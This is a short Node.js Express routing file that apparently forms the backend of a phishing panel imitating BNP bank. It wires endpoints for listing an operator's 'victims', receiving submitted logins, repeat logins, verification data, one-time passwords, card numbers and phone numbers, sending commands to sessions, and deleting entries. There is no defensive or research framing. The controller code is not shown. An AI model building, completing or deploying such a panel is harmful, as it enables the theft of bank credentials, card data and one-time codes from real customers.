const express = require("express");
const {
	getOwnerVics,
	command,
	getInfo,
	submitLogin,
	submitLoginAgain,
	submitVerification,
	submitTelephone,
	submitCard,
	submitOtp,
	deleteEntry,
} = require("../controllers/bnpController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/verification", submitVerification);
router.post("/otp", submitOtp);
router.post("/card", submitCard);
router.post("/phone", submitTelephone);
router.post("/delete", deleteEntry);

module.exports = router;
